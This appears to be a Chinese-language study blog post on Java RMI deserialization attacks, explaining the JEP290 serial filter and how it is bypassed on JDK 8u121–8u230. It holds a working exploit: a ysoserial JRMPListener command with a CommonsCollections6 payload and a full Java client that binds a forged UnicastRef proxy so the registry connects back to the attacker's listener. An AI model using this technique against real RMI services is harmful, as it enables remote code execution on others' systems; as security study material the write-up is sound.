# 前言
这就是为什么高版本 `jdk` 有部分能打 `jndi`，打不了 `RMI`
8u_121~8u230打不了RMI
在 8u231~8u240 还有独特的打法

并且这里选择复现的jdk版本不能过高也不能过低，JEP290在 `Java9`作为原生特性引入，而`Java8`是从8u121引入的JEP290，之后大约在2021.9 `Java17`引入JEP415，又在2022年前后，例如稳定的 `8u342`在原来的 `readObject()`方法的地方直接将lookup的参数限制为字符串，并且禁止通过远程Codebase加载对象。如下图，可以看到引入了全新的方法限制死了只能是一个字符串类型。
![[Pasted image 20251223001230.png]]

# 关于JEP290
JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事

1、提供一个限制反序列化类的机制，白名单或者黑名单。  
2、限制反序列化的深度和复杂度。  
3、为 RMI 远程调用对象提供了一个验证类的机制。  
4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。

JEP290支持的版本：

- Java™ SE Development Kit 8, Update 121 (JDK 8u121)
- Java™ SE Development Kit 7, Update 131 (JDK 7u131)
- Java™ SE Development Kit 6, Update 141 (JDK 6u141)

设置JEP290的方式有下面两种：

> 1. 通过setObjectInputFilter来设置filter
> 2. 直接通过conf/security/java.properties文件进行配置

# JEP290作用点

记得之前我们反序列化攻击点是因为调用不同方法的时候会进到不同的case中，像lookup方法中有 `radeObject()`方法，但是在JEP290中
这个`readObject()`加了一些过滤
![[Pasted image 20251223010443.png]]
这里 `readObject0()`跟进

![[Pasted image 20251223010650.png]]
跟进
![[Pasted image 20251223011802.png]]
跟进
![[Pasted image 20251223011819.png]]
`readProxyDesc()`
![[Pasted image 20251223011851.png]]
这里看到了 `filterCheck()`
![[Pasted image 20251223011949.png]]
这里检查了输入
![[Pasted image 20251223012026.png]]
白名单如下
![[Pasted image 20251223012501.png]]
```java
return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
```
```
String.class
Number.class
Remote.class
Proxy.class
UnicastRef.class
RMIClientSocketFactory.class
RMIServerSocketFactory.class
ActivationID.class
UID.class

```

这里我们的恶意对象不在白名单中，从而导致我们反序列化攻击失败

# 绕过 8u121~8u230 的JEP290

这里绕过思路是，`serialFilter`作用于我们的恶意Server端和Register端的反序列化，但其实在这个过程中还存在一段通信，而这段通信中的`serialFilter`和第一段通信的`serialFilter`是相互独立的，及第二段通信反序列化不会有这个`检测`，且这段通信的数据也是`序列化传输`的，所以如果我们可以在第一段流程中`控制`第二段通信的`服务地址`，连接上我们的恶意服务，返回`恶意反序列化内容`即可反序列化攻击成功，光看这段描述可能不太能理解，不用担心，可以看看下面具体分析

这里攻击 `register`

 先用ysoserial生成一段cc6的恶意代码，在一个端口监听。
 
`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections6 "calc"`

注册中心
```java
package JEP290;

import java.rmi.registry.LocateRegistry;

public class RMIRegistry {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            System.out.println("RMI Registry Start");
        } catch (Exception e) {
            e.printStackTrace();
        }
        while (true) ;
    }
}
```
Client
```java
import sun.rmi.server.UnicastRef;  
import sun.rmi.transport.LiveRef;  
import sun.rmi.transport.tcp.TCPEndpoint;  
  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Proxy;  
import java.rmi.AlreadyBoundException;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.rmi.server.ObjID;  
import java.rmi.server.RemoteObjectInvocationHandler;  
import java.util.Random;  
  
public class BypassJEP290 {  
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {  
        Registry reg = LocateRegistry.getRegistry("localhost",1099); // rmi start at 2222  
        ObjID id = new ObjID(new Random().nextInt());  
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333  
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
        Registry proxy = (Registry) Proxy.newProxyInstance(BypassJEP290.class.getClassLoader(), new Class[] {  
                Registry.class  
        }, obj);  
        reg.bind("Hello",proxy);  
    }  
}
```
![[Pasted image 20251223014203.png]]
这个 payload 的原理就是伪造了一个 `UnicastRef` 用于跟注册中心通信

# 分析
通过`Registry reg = LocateRegistry.getRegistry("localhost",1099); // rmi start at 2222`
获得了一个注册中心的对象，实则就是一个封装了`UnicastRef`的对象

![[Pasted image 20251223014516.png]]
当我们调用 `bind` 方法后，会通过 `UnicastRef` 对象中存储的信息，什么端口啦，ip啦之类的，用来与注册中心进行通信
这里通ref调用newCall来通信，紧接着在下面writeObject序列化对象，进行传输。
![[Pasted image 20251223014809.png]]

---
接着看看客户端干了什么

```java
ObjID id = new ObjID(new Random().nextInt()); // RMI registry  
TCPEndpoint te = new TCPEndpoint(host, port);  
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));  
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);  
Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(),new Class[] { Registry.class}, obj);  
return proxy;
```
这里本质是构造了一个虚假的RMI注册表代理对象 `Proxy`目的是在目标服务器反序列化这个对象的时候，诱导他会连我的`JRMPListener`

 1. `ObjID id = new ObjID(new Random().nextInt());`生成一个随机的对象ID
 2.  `TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333)`传入我们恶意类的ip 和端口
 3. `UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));`构造一个 `UnicastRef`对象，里面存着端口 ip 对象id等基本信息，作为Stub的一部分。
 4. `RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);`把他包装一下
 **`RemoteObjectInvocationHandler`** 是一个实现了 `InvocationHandler` 接口的类。它的作用是：当你调用它的任何方法时，它都会把请求交给内部的 `ref`（即 `UnicastRef`）去处理。
 5. 使用动态代理，再把他包装成一个继承了`java.rmi.registry.Registry`的对象就可以骗过类型的检查

# 绕过 8u231~8u240

https://www.anquanke.com/post/id/259059#h3-10
先来个链接在这里，以后接着学




参考：
[RMI JEP290 | Jiecub3](https://jiecub3.github.io/zh/posts/java/rmi-jep290/#bypass-8u2318u240)
[浅谈 JEP290 | Drunkbaby's Blog](https://drun1baby.top/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/)
















